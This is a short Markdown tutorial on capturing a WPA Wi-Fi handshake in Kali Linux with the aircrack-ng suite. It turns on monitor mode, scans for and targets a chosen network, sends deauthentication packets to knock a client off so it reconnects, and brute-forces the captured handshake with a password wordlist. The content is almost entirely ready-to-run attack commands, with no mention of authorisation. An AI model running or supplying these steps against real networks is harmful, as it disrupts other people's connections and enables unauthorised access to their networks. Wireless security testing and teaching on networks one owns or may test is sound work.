
# Capturing a Wi-Fi Handshake in Kali Linux

## Prerequisites
- A [wireless adapter](https://www.kali.org/docs/nethunter/wireless-cards/) that supports **monitor mode** and **packet injection**.
- The `aircrack-ng` suite (pre-installed in Kali Linux).
- else  install by run below command
```
 sudo apt install aircrack-ng 
 ```
---

## Steps to Capture the Handshake

### 1. Enable Monitor Mode
Run the following commands to start monitor mode:

```bash
sudo airmon-ng check kill  # Kill interfering processes
sudo airmon-ng start wlan0  # Enable monitor mode
```

Replace `wlan0` with your interface name (you can check using `ifconfig` or `iwconfig`).

Your interface will usually be renamed to `wlan0mon`.

---

### 2. Scan for Wi-Fi Networks
To scan for nearby networks, use `airodump-ng`:

```bash
sudo airodump-ng wlan0mon
```

Look for the **BSSID** (MAC address) and **channel (CH)** of the target network.

---

### 3. Capture the Handshake
Once you have identified the target network, run the following command to capture packets and the handshake:

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w handshake wlan0mon
```

- Replace `<channel>` with the Wi-Fi channel number.
- Replace `<BSSID>` with the network’s MAC address.
- `-w handshake`: Saves the captured packets in a file named `handshake-01.cap`.

Wait for a **handshake to appear** (this happens when a device connects or reconnects).

---

### 4. Deauthenticate a Client (Optional)
To force a device to reconnect and capture the handshake, run:

```bash
sudo aireplay-ng -0 5 -a <BSSID> -c <Client MAC> wlan0mon
```

- `-0 5`: Sends 5 deauthentication packets.
- `-a <BSSID>`: Target AP MAC address.
- `-c <Client MAC>`: Target client device MAC (use `airodump-ng` to find it).

---

### 5. Verify Handshake Capture
Check if the handshake was captured:

```bash
aircrack-ng handshake.cap -w /path/to/wordlist.txt
```

Look for `[ WPA handshake: <BSSID> ]` at the top of the output.

---

## 6.Bruteforce using aircrack-ng
```bash
sudo aircrack-ng <your_capture_file.cap> -w <possible_passwordlist.txt>
```
